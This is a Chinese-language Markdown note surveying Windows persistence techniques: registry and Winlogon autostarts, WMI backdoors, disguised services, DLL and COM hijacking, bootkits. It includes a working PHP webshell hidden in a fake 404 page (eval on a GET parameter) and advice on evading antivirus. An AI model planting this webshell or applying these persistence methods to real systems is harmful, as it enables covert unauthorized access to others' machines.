<!-- TOC -->

- [1. 开机自启动](#1-开机自启动)
- [2. 用户登录时的自启动](#2-用户登录时的自启动)
- [3. 定时任务（schtasks、at）](#3-定时任务schtasksat)
- [4. WMI](#4-wmi)
- [5. webshell](#5-webshell)
- [6. 自启动服务](#6-自启动服务)
- [7. DLL加载顺序劫持](#7-dll加载顺序劫持)
    - [7.1. 正常加载顺序](#71-正常加载顺序)
    - [7.2. 安全加载顺序](#72-安全加载顺序)
    - [7.3. KnownDLL保护措施](#73-knowndll保护措施)
- [8. COM劫持](#8-com劫持)
    - [8.1. 参考资料](#81-参考资料)
- [9. Bootkit](#9-bootkit)
    - [9.1. 参考资料](#91-参考资料)
- [10. 启动型DLL注入（进程启动时会自动加载DLL）](#10-启动型dll注入进程启动时会自动加载dll)
- [11. 修改或者替换系统的二进制文件，并伪造签名](#11-修改或者替换系统的二进制文件并伪造签名)

<!-- /TOC -->
# 1. 开机自启动
* 注册表项：`HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run`
* Startup文件夹
# 2. 用户登录时的自启动
* 在注册表路径：`HKCU\Environment\`创建字符串键值：`UserInitMprLogonScript`，键值设置为特定的脚本路径即可
* 修改`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`，修改为特定脚本、批处理路径
* 注册表`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`下其他表项，甚至可以允许恶意代码在安全模式下加载
# 3. 定时任务（schtasks、at）
从任务计划程序中可以看到列表
# 4. WMI
WMI是微软基于Web的企业管理（WBEM）的实现版本，这是一项行业计划，旨在开发用于访问企业环境中管理信息的标准技术。主要与Powershell命令配合使用可以实现无文件攻击重要方式，具有良好的隐蔽性也是目前较为常用的持久化手段。WMI对象主要是执行一个WQL(WMI Query Language)的查询后，本地调用Powershell执行响应的代码由于没有文件保存在本地磁盘能够较好的免查杀。Black Hat 2015公布了一个WMIBackdoor的poc毕竟还是经典，在流行的powersploit与nishang框架里面也有相关的ps1文件。传送门：https://github.com/mattifestation/WMI_Backdoor
# 5. webshell
在指定的web服务器路径藏的很深的那种放置一个webshell，同时做好免杀后的shell往往比常规的系统后门更难被发现，这个操作很常规。
可以插入到网站自身的404页面中，注意 header要放在第一行,否则在利用的时候日志记录的不会是404
```html
<?php
    header('HTTP/1.1 404 Not Found');
    @eval($_GET["Error"]); // 一句话
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
    <head>
        <title>404 Not Found</title>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </body>
</html>
```
各类webshell种类比较多传送门：https://github.com/xl7dev/WebShell
# 6. 自启动服务
简单的分为二种方式将自己的恶意的可执行文件注册成服务或者调用系统进程如svchost加载dll文件运行服务。第二种方式相对隐蔽性较好由于系统进程的特殊性往往不敢轻易终止进程，由于此类均在PE文件或者其他类型文件在磁盘中容易被查杀，特殊处理过的除外。

Metasploit在Meterpreter下可以运行run metsvc将会在目标主机上以Meterpreter的服务的形式注册在服务列表中，并开机自动自动，但是此类操作极容易被AV查杀。 

如下是永恒之蓝挖矿病毒一个常见病毒，通过伪装服务名为系统服务瞒天过海。

加入一个已存在的服务组或者覆盖一个无关紧要的服务（新创建服务组容易被探测）。
# 7. DLL加载顺序劫持
## 7.1. 正常加载顺序
DLL加载顺序如下：
* 加载应用程序的目录
* 当前目录（GetCurrentDirectory），chdir函数会更改此值
* 系统目录（GetSystemDirectory）
* 16位子系统的系统目录（.../Windows/System）
* Windows目录（GetWindowsDirectory）
* PATH环境变量目录
## 7.2. 安全加载顺序
如果启用了安全加载，则顺序为134526。
## 7.3. KnownDLL保护措施
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`里面列出了一些Dll文件，可以跳过DLL的加载过程直接从系统目录加载。另外有相关键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\ExcludeFromKnownDlls`。
# 8. COM劫持
主要通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例，所以，这就可以用作后门来使用，并且，该方法也能够绕过Autoruns对启动项的检测。
## 8.1. 参考资料
* https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
* Powershell版本的POC：https://github.com/3gstudent/COM-Object-hijacking
# 9. Bootkit
MBR后门主要的思路是读取主引导记录和把分区表从主引导记录中复制出来。然后把自己的包含恶意二进制数据的主引导记录放到主引导扇区，并复制新的分区表到它。但是，并非只有分区表需要保留，还有原来的主引导记录也需要保存下来，MBR病毒复制原始主引导记录到其它64个未用到的扇区。到MBR病毒执行完自己的操作后在读取原始的主引导记录并跳到0x7c00处执行来引导开机，比如暗云系列木马。通过PCHunter也能够进行简单的MBR的异常判断，此类后门往往具有较大的实施难度病毒种类往往也较少。
## 9.1. 参考资料
* https://slab.qq.com/news/tech/1308.html
# 10. 启动型DLL注入（进程启动时会自动加载DLL）
[Windows进程注入技术](../恶意代码/Windows进程注入技术.md)
# 11. 修改或者替换系统的二进制文件，并伪造签名